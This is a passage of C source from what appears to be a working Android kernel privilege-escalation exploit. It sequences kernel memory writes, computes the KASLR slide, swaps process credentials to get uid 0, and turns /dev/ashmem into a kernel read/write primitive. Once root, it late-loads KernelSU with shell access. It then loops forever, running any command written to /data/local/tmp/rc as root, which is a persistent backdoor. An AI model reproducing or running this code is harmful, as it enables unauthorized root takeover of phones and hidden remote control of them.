               ok, miss, pr_probe_deltas ? " cand_delta=" : "",
               pr_probe_deltas ? (size_t)pr_cand_delta : (size_t)0);
    /* §124.25: unbuffered != durable.  _IONBF only guarantees the line left
       userspace; the bytes then sit in the page cache, and a kernel panic
       (which kills writeback) leaves an allocated-but-all-NUL file on disk
       (measured: vmin.log 5298 B, 100 % NUL).  fflush+fsync per round keeps at
       least the round coordinates of the dying run on disk. */
    fflush(stdout);
    fsync(STDOUT_FILENO);

    atomic_store(&pr_release, r);
    while (atomic_load(&pr_owner_released) != r) {
      usleep(500);
    }

    /* page diff vs the previous round: attributes the walk's collateral to the
       round that caused it (the slide round and a direct round differ).
       §124.60: [M] heartbeat into the prdiff span (raw write, no stdio).
       The HIT deaths (58/59b/62) stopped between the HIT result line and the
       banner [M] - this span (prdiff memcpy loop + pari + owner-release wait)
       had zero coverage.  Two marks locate any future silent death inside it:
       pre-prdiff / post-prdiff, plus one after the owner-release wait. */
    {
      char hb[64];
      int hbn = snprintf(hb, sizeof(hb), "[M] r=%d pre-prdiff step=%d\n", r, pr_seq_step);
      if (hbn > 0) {
        ssize_t hw = write(STDERR_FILENO, hb, (size_t)hbn);
        (void)hw;
      }
    }
    if (pr_ref && payload_copy_out(pr_cur, SKB_SEND_SIZE) ==
                      (size_t)SKB_SEND_SIZE) {
      int changed = 0;
      for (size_t o = 0; o + 8 <= (size_t)SKB_SEND_SIZE; o += 8) {
        uint64_t a = 0;
        uint64_t c = 0;
        memcpy(&a, pr_ref + o, 8);
        memcpy(&c, pr_cur + o, 8);
        if (a != c) {
          if (changed < 12) {
            pr_info("prdiff round=%d off=%03zx was=%016llx now=%016llx\n",
                    r, o, (unsigned long long)a, (unsigned long long)c);
          }
          changed++;
        }
      }
      pr_success("prdiff round=%d slide=%d changed_words=%d\n",
                 r, is_slide, changed);
      memcpy(pr_ref, pr_cur, SKB_SEND_SIZE);
    }
    {
      /* §124.124 E4 write oracle: with the calibration geometry the walk's
         write should leave (alias+0x40) at page offset 0x20, exactly like the
         ownprobe HIT.  found=1 => the seq round performs the write. */
      const char *e4 = getenv("SEQOVL_E4CAL");
      if (e4 && *e4 && *e4 != '0') {
        size_t pg = 0;
        int f = physmap_find_self(dmap_alias() + 0x40, 0x20, &pg);
        pr_success("E4 write oracle: found=%d page=%zu\n", f, pg);
      }
    }
    {
      char hb[64];
      int hbn = snprintf(hb, sizeof(hb), "[M] r=%d post-prdiff owner_wait step=%d\n",
                         r, pr_seq_step);
      if (hbn > 0) {
        ssize_t hw = write(STDERR_FILENO, hb, (size_t)hbn);
        (void)hw;
      }
    }

    if (pr_own_done && !pr_sweep_hit) {
      pr_success("ownprobe complete: page verified as ours, stopping (no seq)\n");
      break;
    }

    if (pr_seq && !(pr_sweep && !pr_sweep_hit)) {
      if (landed && pr_hit_step_pending) {
        /* the hit round just ended: force the NEXT round to be step 0 (the
           slide round).  Without this the increment below makes the next round
           step 1, whose case re-stages the probe write, so the slide never runs
           (kaslr_base stays 0 and the read steps compute bare image offsets).
           §124.52: the banner round shares step 0 but must NOT clear the
           pending flag - the slide round that follows still needs it. */
        if (pr_banner_pending) {
          pr_seq_step = 0;   /* banner passed (cleared in verify); slide next */
        } else {
          pr_hit_step_pending = 0;
          pr_seq_step = 0;
        }
      } else if (landed) {
        pr_seq_step++;
        /* §124.123 SEQ_MINIMAL: skip PID1-anchor chain (3/4/5, Path-A only).
           mode-7 writes need slide (0) + tail task (1/2) + cred (6) only.
           Gated by env, default off (production path untouched). */
        {
          const char *sm = getenv("SEQ_MINIMAL");
          if (sm && *sm && *sm != '0' && (pr_seq_step == 3)) {
            pr_seq_step = 6;
            pr_info("SEQ_MINIMAL: step 3/4/5 skipped (tail->cred)\n");
          }
        }
        pr_seq_attempt = 0;
        /* §124.42: forensic stop after step pr_seq_end lands. */
        if (pr_seq_end >= 0 && pr_seq_step > pr_seq_end) {
          pr_success("seq forensic stop after step %d - clean stop\n", pr_seq_end);
          break;
        }
        if (pr_seq_step >= (pr_short_seq ? 3 : (pr_seq_cfi ? 2 : (pr_seq_vcfi_min ? 7 : 11)))) {
          break;
        }
      } else {
        if (pr_seq_fatal) {
          if (pr_seq_step == 2 && pr_seq_attempt < PR_TAIL_RETRIES) {
            /* ?113.30: the tail moved (a system process forked between our burst
               and the write).  Redo the tail read with a fresh burst + slot. */
            pr_seq_attempt++;
            pr_seq_fatal = 0;
            pr_seq_step = 1;
            pr_warning("verify failed: redoing the tail read (retry %d/%d)\n",
                       pr_seq_attempt, PR_TAIL_RETRIES);
          } else {
            pr_error("seq fatal (verify failed) - clean stop, reboot to rerun\n");
            break;
          }
        } else {
          pr_seq_attempt++;
          pr_warning("seq step=%d attempt=%d failed; retry with new parity\n",
                     pr_seq_step, pr_seq_attempt);
          if (pr_seq_attempt >= 4) {
            pr_error("seq step=%d exhausted\n", pr_seq_step);
            break;
          }
        }
      }
    }
  }

  if (pr_seq) {
    pr_success("seq pre-normalise euid=%u pr_seq_step=%d\n",
               geteuid(), pr_seq_step);
    if (geteuid() == 0) {
      setresgid(0, 0, 0);
      setresuid(0, 0, 0);
    }
    pr_success("seq result step=%d uid=%u euid=%u gid=%u egid=%u\n",
               pr_seq_step, getuid(), geteuid(), getgid(), getegid());
    /* §124.11 Path A: the fops redirect has landed - now turn /dev/ashmem into
       the precise kernel r/w (open, configfs read/write, self-check of the field)
       and report.  Runs OUTSIDE the PI trigger, so a failure here cannot poison
       a tree; it is plain userspace work on top of the installed fops. */
    if (pr_cfi_ready != NULL) {
      *pr_cfi_ready = 1;   /* §124.17: wake the rooted victim's CFI stage */
      /* §124.33 (C): the rooted victim watches getppid() and bails out when the
         parent dies ("a dead parent cannot make the victim waste the window").
         That guard, plus this process returning immediately, is why the rooted
         victim left its park loop with no chunk, no AVC and no [V] line.  When
         the victim is the one that must run the stage, the parent has to
         OUTLIVE the handoff: stay alive past the victim's stage. */
      if (g_victim_cfi) {
        sleep(150);
      }
    }
    if (!g_victim_cfi && pr_seq_step >= (pr_seq_cfi ? 2 : (pr_seq_vcfi_min ? 7 : 11)) && pmap_buf_addr()) {
      cfi_stage((unsigned char *)pmap_buf_addr(), dmap_alias());
    }
    /* ?118.8: make the evidence durable the moment the seq succeeds.  The parent
       syncs again in qmain, but that is only after run_exploit returns - and the
       rooted victim's 30 s window (probe, then sysrq) sits between.  A panic in
       that window would eat a log whose pages are still dirty in the page cache
       (`_IONBF` gets the bytes into the kernel; only sync() gets them to flash).
       Three layers, complete: _IONBF -> sync -> fflush. */
    fflush(NULL);
    sync();
    if (geteuid() == 0) {
      /* the creds landed on OUR main thread (the tail process leader); prove the
         process really is privileged by forking a child that reports its ids */
      pid_t c2 = fork();
      if (c2 == 0) {
        pr_success("B''-ROOT-CHILD uid=%u euid=%u gid=%u egid=%u (forked after "
                   "the cred swap)\n",
                   getuid(), geteuid(), getgid(), getegid());
        _exit(0);
      }
      int st = 0;
      waitpid(c2, &st, 0);
      pr_success("B'' root child reaped status=%d\n", st);
    }
  }

  atomic_store(&pr_stop, 1);
  pr_trace("persist-complete", rounds, ok);
  pr_success("persist done rounds=%d ok=%d miss=%d no_restore=%d\n",
             rounds, ok, miss, g_no_restore);
  if (pr_short_seq && geteuid() == 0) {
    /* §124.124b: never exit with a borrowed/static cred - an exit-path
       put_cred() BUG_ON(cred != real_cred) is the known panic window. */
    pr_success("shortseq: ROOT euid=0 - dumping evidence then parking\n");
    {
      DIR *d = opendir("/sys/fs/pstore");
      if (d) {
        struct dirent *e;
        while ((e = readdir(d)) != NULL) {
          if (e->d_name[0] == '.') continue;
          char p[256];
          snprintf(p, sizeof(p), "/sys/fs/pstore/%s", e->d_name);
          int fd = open(p, O_RDONLY);
          if (fd >= 0) {
            char b[4096];
            ssize_t n = read(fd, b, sizeof(b) - 1);
            if (n > 0) { b[n] = 0; pr_success("PSTORE %s:\n%s\n", e->d_name, b); }
            close(fd);
          }
        }
        closedir(d);
      } else {
        pr_success("pstore opendir errno=%d\n", errno);
      }
      int fd = open("/proc/kmsg", O_RDONLY | O_NONBLOCK);
      if (fd >= 0) {
        char b[4096];
        ssize_t n = read(fd, b, sizeof(b) - 1);
        if (n > 0) { b[n] = 0; pr_success("KMSG:\n%s\n", b); }
        close(fd);
      }
    }
    signal(SIGCHLD, SIG_IGN);   /* never block on an rc child (a hung ksud etc.) */
    /* §124.125: attempt the KernelSU LKM late-load once, output to a file. */
    {
      pid_t c = fork();
      if (c == 0) {
        int kf = open("/data/local/tmp/ksud.out", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (kf >= 0) { dup2(kf, 1); dup2(kf, 2); if (kf > 2) close(kf); }
        execl("/data/local/tmp/ksud", "ksud", "late-load",
              "--kmi", "android12-5.10", "--allow-shell", (char *)0);
        _exit(127);
      }
      sleep(4);
      pr_success("ksud late-load attempted (see /data/local/tmp/ksud.out)\n");
    }
    for (;;) {
      /* rc file interface: write a shell command line into /data/local/tmp/rc
         and it runs here as uid 0 (both cred and real_cred are init_cred, so a
         forked sh's exit is consistent and safe). */
      int fd = open("/data/local/tmp/rc", O_RDONLY);
      if (fd >= 0) {
        char cmd[1024];
        ssize_t n = read(fd, cmd, sizeof(cmd) - 1);
        close(fd);
        if (n > 0) {
          cmd[n] = 0;
          pr_success("RC exec (uid=%u): %s\n", getuid(), cmd);
          pid_t c = fork();
          if (c == 0) {
            execl("/system/bin/sh", "sh", "-c", cmd, (char *)0);
            _exit(127);
          }
        }
        unlink("/data/local/tmp/rc");
      }
      sleep(2);
    }
  }
  return miss == 0;
}
